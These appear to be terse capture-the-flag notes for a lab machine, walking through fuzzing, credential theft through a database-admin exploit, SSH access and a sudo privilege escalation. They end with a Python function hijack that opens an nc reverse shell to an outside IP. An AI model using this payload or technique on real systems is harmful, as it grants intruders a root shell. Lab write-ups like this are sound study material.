on webpage we are not getting anything fuzzing is our option.

we get files and cred then with cred we get admirer login page.
using admirer exploit to connect to remote database and use sql command we get our cred.


and ssh in it.
sudo -l

after searching we got backup.py runing
and we can cat it from waldo
we see a function in it.
we use this function to run out nc 

import os 

def make_archive(a, b, c): # need 3 paramaters like the real function even if they won't be used
	os.system('nc 10.10.15.203 4444 -e "/bin/sh"')
